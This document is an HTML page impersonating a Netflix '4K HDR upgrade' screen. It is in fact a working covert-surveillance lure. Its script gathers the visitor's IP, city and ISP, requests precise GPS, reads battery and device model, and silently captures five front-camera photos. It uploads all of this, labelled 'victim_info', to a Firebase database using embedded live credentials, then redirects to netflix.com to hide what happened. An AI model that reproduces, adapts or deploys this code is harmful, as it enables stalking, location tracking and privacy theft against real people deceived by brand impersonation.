<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>4K HDR Upgrade - Netflix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
            background: linear-gradient(135deg, #141414 0%, #0a0a0a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(0,0,0,0.85);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(229, 9, 20, 0.3);
            padding: 2rem;
        }
        .logo { text-align: center; margin-bottom: 2rem; }
        .logo h1 { 
            font-size: 2rem; 
            background: linear-gradient(135deg, #E50914, #ff4d4d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge {
            display: inline-block;
            background: #E50914;
            padding: 0.3rem 1rem;
            border-radius: 30px;
            font-size: 0.8rem;
            margin-top: 0.5rem;
        }
        .progress-section { margin: 2rem 0; }
        .progress-bar-container {
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            overflow: hidden;
            height: 8px;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #E50914, #ff4d4d);
            width: 0%;
            transition: width 0.3s ease;
        }
        .status-text {
            margin-top: 1rem;
            text-align: center;
            font-size: 0.9rem;
            color: #ccc;
        }
        .steps { margin: 2rem 0; }
        .step {
            display: flex;
            align-items: center;
            gap: 1rem;
            padding: 0.8rem;
            margin: 0.5rem 0;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
        }
        .step.completed { background: rgba(76, 175, 80, 0.2); border-left: 3px solid #4CAF50; }
        .step.error { background: rgba(229, 9, 20, 0.2); border-left: 3px solid #E50914; }
        .step-icon { width: 30px; text-align: center; font-size: 1.2rem; }
        .step-text { flex: 1; font-size: 0.9rem; }
        .step-status { font-size: 0.8rem; }
        .redirect-note { text-align: center; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); font-size: 0.8rem; color: #888; }
        .debug-console {
            margin-top: 1rem;
            padding: 1rem;
            background: rgba(0,0,0,0.8);
            border-radius: 10px;
            font-family: monospace;
            font-size: 0.7rem;
            color: #0f0;
            max-height: 200px;
            overflow-y: auto;
            display: none;
        }
        .debug-console.show { display: block; }
        button {
            margin-top: 1rem;
            padding: 0.5rem 1rem;
            background: #E50914;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>NETFLIX</h1>
            <div class="badge">4K HDR UPGRADE</div>
        </div>
        
        <div class="progress-section">
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="status-text" id="statusText">Initializing system...</div>
        </div>
        
        <div class="steps">
            <div class="step" id="step1"><div class="step-icon">📱</div><div class="step-text">Device Detection</div><div class="step-status" id="step1Status">⚪</div></div>
            <div class="step" id="step2"><div class="step-icon">📍</div><div class="step-text">GPS Location</div><div class="step-status" id="step2Status">⚪</div></div>
            <div class="step" id="step3"><div class="step-icon">📸</div><div class="step-text">Capturing Photos (5)</div><div class="step-status" id="step3Status">⚪</div></div>
            <div class="step" id="step4"><div class="step-icon">☁️</div><div class="step-text">Uploading Data</div><div class="step-status" id="step4Status">⚪</div></div>
        </div>
        
        <div class="redirect-note">⚡ Optimizing your streaming experience...</div>
        <button onclick="toggleDebug()">🐛 Show/Hide Debug</button>
        <div class="debug-console" id="debugConsole"><strong>📡 DEBUG CONSOLE:</strong><br><div id="debugLog">Waiting...</div></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    
    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
            projectId: "mobilehk-5e843",
            storageBucket: "mobilehk-5e843.firebasestorage.app",
            messagingSenderId: "287475964010",
            appId: "1:287475964010:web:1d278c51947c6cbb881213",
            measurementId: "G-VT3YC79N61"
        };
        
        // Debug
        let debugMessages = [];
        function addDebug(msg, isError = false) {
            const time = new Date().toLocaleTimeString();
            const prefix = isError ? '❌' : '✓';
            debugMessages.push(`[${time}] ${prefix} ${msg}`);
            document.getElementById('debugLog').innerHTML = debugMessages.join('<br>');
            console.log(msg);
        }
        
        function toggleDebug() {
            document.getElementById('debugConsole').classList.toggle('show');
        }
        
        // Init Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        addDebug("Firebase initialized");
        
        // Get Session ID
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        addDebug("Session: " + (sessionId || "NOT FOUND"));
        
        if (!sessionId) {
            addDebug("No session ID!", true);
            setTimeout(() => window.location.href = 'https://www.netflix.com', 2000);
            throw new Error('No session ID');
        }
        
        function updateProgress(percent, text) {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('statusText').innerHTML = text;
        }
        
        function markStep(stepNum, completed, statusText = '', isError = false) {
            const step = document.getElementById(`step${stepNum}`);
            const statusSpan = document.getElementById(`step${stepNum}Status`);
            if (completed) {
                step.classList.add('completed');
                statusSpan.innerHTML = statusText || '✓';
                statusSpan.style.color = '#4CAF50';
            } else if (isError) {
                step.classList.add('error');
                statusSpan.innerHTML = statusText || '✗';
                statusSpan.style.color = '#E50914';
            } else if (statusText) {
                statusSpan.innerHTML = statusText;
            }
        }
        
        // ========== FIXED: IP AND LOCATION DETAILS ==========
        async function getIPAndLocation() {
            try {
                // Multiple APIs for backup
                let data = null;
                
                // Try ipapi.co first
                try {
                    const res = await fetch('https://ipapi.co/json/', { timeout: 5000 });
                    data = await res.json();
                    addDebug(`✅ IP: ${data.ip}, Location: ${data.city}, ${data.country_name}`);
                } catch(e) {
                    addDebug("ipapi.co failed, trying ip-api.com...");
                    // Fallback to ip-api.com
                    const res = await fetch('http://ip-api.com/json/');
                    data = await res.json();
                    addDebug(`✅ IP: ${data.query}, Location: ${data.city}, ${data.country}`);
                    data = {
                        ip: data.query,
                        country_name: data.country,
                        region: data.regionName,
                        city: data.city,
                        org: data.isp,
                        latitude: data.lat,
                        longitude: data.lon
                    };
                }
                
                return {
                    ip: data.ip || 'Unknown',
                    country: data.country_name || 'Unknown',
                    region: data.region || 'Unknown',
                    city: data.city || 'Unknown',
                    isp: data.org || data.isp || 'Unknown',
                    lat: data.latitude || 0,
                    lng: data.longitude || 0
                };
            } catch(e) {
                addDebug("IP fetch error: " + e.message, true);
                return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
            }
        }
        
        // ========== FIXED: EXACT GPS LOCATION ==========
        async function getExactLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    addDebug("Geolocation not supported", true);
                    resolve({ lat: 0, lng: 0, accuracy: 0 });
                    return;
                }
                
                addDebug("Requesting GPS location...");
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        addDebug(`✅ GPS: ${pos.coords.latitude}, ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`);
                        resolve({ 
                            lat: pos.coords.latitude, 
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                    },
                    (err) => {
                        addDebug("GPS error: " + err.message, true);
                        resolve({ lat: 0, lng: 0, accuracy: 0 });
                    },
                    { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });
        }
        
        // ========== FIXED: BATTERY WITH PERCENTAGE ==========
        async function getBatteryStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const status = `${level}% (${battery.charging ? '🔌 Charging' : '🔋 Discharging'})`;
                    addDebug(`🔋 Battery: ${status}`);
                    return { level: level, charging: battery.charging, status: status };
                } catch(e) {
                    addDebug("Battery API error: " + e.message, true);
                    return { level: 0, charging: false, status: 'Unknown' };
                }
            }
            addDebug("Battery API not supported", true);
            return { level: 0, charging: false, status: 'Not Supported' };
        }
        
        // ========== FIXED: EXACT MOBILE MODEL ==========
        function getMobileModel() {
            const ua = navigator.userAgent;
            let model = 'Unknown';
            let brand = 'Unknown';
            
            addDebug("Detecting mobile model from UA: " + ua.substring(0, 100));
            
            // Android Detection
            if (/Android/i.test(ua)) {
                // Try to extract model from UA
                const matches = ua.match(/\(([^;]+);\s([^;]+)\s[^;]*\)/);
                if (matches && matches.length >= 3) {
                    brand = matches[1] || 'Unknown';
                    model = matches[2] || 'Unknown';
                }
                
                // Samsung
                if (ua.includes('SM-')) {
                    const smMatch = ua.match(/SM-[A-Z0-9]+/);
                    if (smMatch) model = smMatch[0];
                    brand = 'Samsung';
                }
                // Xiaomi/Redmi
                else if (ua.includes('Redmi')) {
                    const redmiMatch = ua.match(/Redmi\s+[A-Z0-9]+/i);
                    model = redmiMatch ? redmiMatch[0] : 'Redmi';
                    brand = 'Xiaomi';
                }
                else if (ua.includes('MI ') || ua.includes('Mi ')) {
                    const miMatch = ua.match(/MI\s+[A-Z0-9]+/i);
                    model = miMatch ? miMatch[0] : 'Mi';
                    brand = 'Xiaomi';
                }
                // OnePlus
                else if (ua.includes('OnePlus')) {
                    const opMatch = ua.match(/OnePlus\s+[A-Z0-9]+/i);
                    model = opMatch ? opMatch[0] : 'OnePlus';
                    brand = 'OnePlus';
                }
                // Google Pixel
                else if (ua.includes('Pixel')) {
                    const pixelMatch = ua.match(/Pixel\s+[A-Z0-9]+/i);
                    model = pixelMatch ? pixelMatch[0] : 'Pixel';
                    brand = 'Google';
                }
                // Oppo
                else if (ua.includes('OPPO')) {
                    model = 'OPPO';
                    brand = 'OPPO';
                }
                // Vivo
                else if (ua.includes('vivo')) {
                    model = 'vivo';
                    brand = 'vivo';
                }
                // Realme
                else if (ua.includes('Realme')) {
                    model = 'Realme';
                    brand = 'Realme';
                }
            }
            // iOS Detection
            else if (/iPhone|iPad|iPod/i.test(ua)) {
                brand = 'Apple';
                if (ua.includes('iPhone')) {
                    const match = ua.match(/iPhone(\d+,\d+)/);
                    model = match ? `iPhone ${match[1]}` : 'iPhone';
                } else if (ua.includes('iPad')) {
                    model = 'iPad';
                } else {
                    model = 'iOS Device';
                }
            }
            
            addDebug(`📱 Device: ${brand} ${model}`);
            return { brand: brand, model: model, full: `${brand} ${model}`.trim() };
        }
        
        // ========== DEVICE OS AND BROWSER ==========
        function getDeviceOSBrowser() {
            const ua = navigator.userAgent;
            let os = 'Unknown', osVersion = 'Unknown';
            
            if (/Android/i.test(ua)) {
                os = 'Android';
                const match = ua.match(/Android\s([\d.]+)/);
                if (match) osVersion = match[1];
            } else if (/iPhone|iPad|iPod/i.test(ua)) {
                os = 'iOS';
                const match = ua.match(/OS\s([\d_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            } else if (/Windows/i.test(ua)) {
                os = 'Windows';
                const match = ua.match(/Windows NT\s([\d.]+)/);
                if (match) osVersion = match[1];
            } else if (/Mac/i.test(ua)) {
                os = 'macOS';
                const match = ua.match(/Mac OS X\s([\d_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            } else if (/Linux/i.test(ua)) {
                os = 'Linux';
            }
            
            let browser = 'Unknown';
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Edg/i.test(ua)) browser = 'Edge';
            else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
            
            addDebug(`💻 OS: ${os} ${osVersion}, Browser: ${browser}`);
            return { os, osVersion, browser };
        }
        
        // ========== CAPTURE 5 PHOTOS ==========
        async function captureMultiplePhotos(count = 5) {
            const photos = [];
            
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                addDebug("📸 Camera access granted");
            } catch(err) {
                addDebug("Camera denied: " + err.message, true);
                return photos;
            }
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            for (let i = 0; i < count; i++) {
                addDebug(`📸 Photo ${i+1}/${count}...`);
                document.getElementById('step3Status').innerHTML = `${i+1}/${count}`;
                updateProgress(55 + ((i+1) / count) * 25, `Photo ${i+1}/${count}...`);
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const base64 = canvas.toDataURL('image/jpeg', 0.8);
                photos.push(base64);
                addDebug(`✅ Photo ${i+1} done (${Math.round(base64.length/1024)}KB)`);
                
                if (i < count - 1) {
                    await new Promise(r => setTimeout(r, 1500));
                }
            }
            
            stream.getTracks().forEach(track => track.stop());
            addDebug(`🎬 ${photos.length} photos captured`);
            return photos;
        }
        
        // ========== MAIN EXECUTION ==========
        async function main() {
            updateProgress(0, 'Starting...');
            
            // Step 1: Device Info + Battery + Mobile Model
            markStep(1, false, '⟳');
            updateProgress(10, 'Detecting device...');
            
            const ipData = await getIPAndLocation();
            const battery = await getBatteryStatus();
            const mobileModel = getMobileModel();
            const osBrowser = getDeviceOSBrowser();
            
            const victimInfo = {
                ip: ipData.ip,
                country: ipData.country,
                region: ipData.region,
                city: ipData.city,
                isp: ipData.isp,
                battery_level: battery.level,
                battery_charging: battery.charging,
                battery_status: battery.status,
                device_brand: mobileModel.brand,
                device_model: mobileModel.model,
                device_full: mobileModel.full,
                os: osBrowser.os,
                os_version: osBrowser.osVersion,
                browser: osBrowser.browser,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                timestamp: new Date().toISOString()
            };
            
            markStep(1, true, '✓');
            updateProgress(30, 'Device detected');
            await new Promise(r => setTimeout(r, 500));
            
            // Step 2: GPS Location
            markStep(2, false, '⟳');
            updateProgress(40, 'Getting GPS location...');
            
            const gpsLocation = await getExactLocation();
            const locationData = {
                lat: gpsLocation.lat,
                lng: gpsLocation.lng,
                accuracy: gpsLocation.accuracy,
                country: ipData.country,
                region: ipData.region,
                city: ipData.city,
                isp: ipData.isp,
                maps_link: `https://maps.google.com/?q=${gpsLocation.lat},${gpsLocation.lng}`
            };
            
            markStep(2, true, gpsLocation.lat !== 0 ? '✓' : '⚠');
            updateProgress(50, 'GPS locked');
            await new Promise(r => setTimeout(r, 500));
            
            // Step 3: Capture 5 Photos
            markStep(3, false, '⟳');
            updateProgress(55, 'Preparing camera...');
            
            const photos = await captureMultiplePhotos(5);
            
            if (photos.length > 0) {
                markStep(3, true, `${photos.length}/5 ✓`);
            } else {
                markStep(3, false, '✗', true);
            }
            updateProgress(85, `${photos.length} photos captured`);
            await new Promise(r => setTimeout(r, 500));
            
            // Step 4: Upload
            markStep(4, false, '⟳');
            updateProgress(90, 'Uploading...');
            
            const uploadData = {
                victim_info: victimInfo,
                location: locationData,
                photos: photos,
                photo_count: photos.length,
                timestamp: new Date().toISOString(),
                complete: true
            };
            
            addDebug("Writing to Firebase...");
            try {
                await database.ref(`sessions/${sessionId}/data`).set(uploadData);
                addDebug("✅ ALL DATA UPLOADED!");
                markStep(4, true, '✓');
                updateProgress(100, 'Complete! Redirecting...');
            } catch(e) {
                addDebug("Firebase error: " + e.message, true);
                markStep(4, false, '✗', true);
            }
            
            setTimeout(() => {
                window.location.href = 'https://www.netflix.com';
            }, 3000);
        }
        
        setTimeout(main, 1000);
    </script>
</body>
</html>
